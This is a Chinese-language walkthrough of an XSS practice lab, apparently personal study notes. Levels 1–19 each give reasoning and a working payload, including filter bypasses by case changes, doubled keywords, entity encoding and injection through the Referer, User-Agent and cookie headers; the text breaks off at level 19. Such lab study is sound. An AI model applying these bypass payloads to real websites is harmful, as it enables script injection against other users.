## level1
反射型XSS</br>
```java
payload：?name=<script>alert(1)</script>
```

## level2
```java
payload："><script>alert(1)</script>
```

## level3
输入1<"">''内容然后搜索，查看源代码，两个回显点均过滤特殊字符，但是单引号未过滤。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(1).png height="300" width="650">
```java
payload：1' onmouseover='alert(1)
```
鼠标划过输入框上面即弹窗：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(2).png height="300" width="650">

## level4
跟上一关一样，双引号的不同。</br>
```java
payload：1” onmouseover=“alert(1)
```

## level5
script大小写、on事件被禁用：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(3).png height="300" width="650"></br>
但是双引号、单引号、尖括号都可以用</br>
```java
payload：1"><a href="javascript:alert(1)">
```

## level6
script、on事件、href链接相关词被转义：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(4).png height="300" width="650"></br>
可以大小写绕过：</br>
```java
payload：1"><scRipt>alert(1)</scRipt>
```

## level7
输入<script>&lt;onerror&gt;&lt;a hRef&gt;测试，发现对关键字进行了过滤，且大小写不能绕过：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(5).png height="300" width="650"></br>
发现对关键字只进行了一次过滤，可以对关键字双写绕过：</br>
```java
payload：1" oonnmouseover="alert(1)
```
  
## level8
先输入一些关键字符<scripT>&lt;oNerror&gt;&lt;a Href&gt;""''，测试防御情况，看到关键字都被转义，看到a标签考虑使用”<a href="javascript:alert(1)"></a>“，页面有回显的超链接，想办法将script转码一下。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(6).png height="300" width="650"></br>
尝试用如下方式对标签属性值进行转码：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(7).png></br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(8).png></br>
```java
payload：javasc&#13ript:alert(1)
```

## level9
测试看到a标签考虑使用<a href="javascript:alert(1)"></a>，页面有回显的超链接，想办法将script转码一下。</br>
但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用`http://`才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释`http://`</br>
```java
payload：javasc&#9ript:alert(1)/*http://*/
payload：javasc&#9ript:alert(1)//http://
payload：javasc&#9ript:alert(1)<!--http://
```

## level10
右键审查元素发现t_sort的隐藏域可控制输入内容，但是触发隐藏域需要使用accesskey属性，payload如下。</br>
但是触发的时候浏览器不同触发键不一样；另外笔记本键盘和外设键盘可能会影响触发效果。</br>
FireFox下：shift+alt+X (测试成功) </br>
Chrome下：alt+X (Chrome未测试成功) </br>
```java
payload：?t_sort=1"%20accesskey="X"%20onclick="alert(1)
```

## level11
此题比较注入点隐晦，比较难以发现。首先右键查看页面源代码分析，多了一个t_ref隐藏域，进一步分析它是由请求头中的Referer字段取值而来，而且只能从请求头中取Referer值，不能由URL传值；另外我们知道Referer字段是可以伪造的，那么我们可以使用BurpSuite来抓包伪造Referer字段来构造payload。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(9).png height="300" width="650"></br>
```java
payload：Referer: 1" type="txt" oninput="alert(888)
```
这种构造，会将t_ref隐藏域在页面显现，on事件触发条件为在输入框中输入任意值即触发XSS。</br>

## level12
与上一题一样，只不过输入点在User-Agent。</br>
```java
payload：User-Agent: 1" type="txt" oninput="alert(888)
```

## level13
与上一题一样，只不过输入点在cookie。</br>
```java
payload：user=1" type="txt" oninput="alert(888)
```

## level14
查看网页源码，看到<iframe src=></iframe>标签，就应该考虑设法在src处注入：src=javascript(1)。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(10).png></br>
如何替换`src="http://www.exifviewer.org/"`中的网址成了我们要考虑的问题，进一步追踪该网页的来源，最后通过抓包在响应包中发现该网址。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(11).png></br>
那么我们的思路就清楚了，通过抓包，修改响应包的src值来控制输入内容，达到XSS目的。</br>
```java
payload：src="javascript:alert(666)"
```

## level15
与上一关相似，修改响应包数据：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(12).png height="300" width="650"></br>
```
payload："><script>alert(1)</script><"
```

## level16
经测试，script和/均被过滤，空格符号也无法使用，但是on事件可以使用。使用img标签，将空格用url编码%0a、%0b、%0d替换，测试成功。</br>
```
payload：?keyword=<img%0dsrc=a%0donerror=alert(1)>
```

## level17
从上一关跳转到本关，URL中有两个参数?arg01=a&arg02=b；右键查看源码，是embed标签，它支持on事件，可以在参数b后面空格注入on事件构造payload。
```
payload：?arg01=a&arg02=b%20onmousedown=alert(1)
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(13).png></br>

## level 18
与上一关相同，看了代码也是一样的。</br>
```
payload：?arg01=a&arg02=b%20onmouseup=alert(1)
```

## level19
与上面一关解题思路一样，但是输入内容被加了双引号，使用双引号闭合却发现双引号被转义：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(14).png></br>





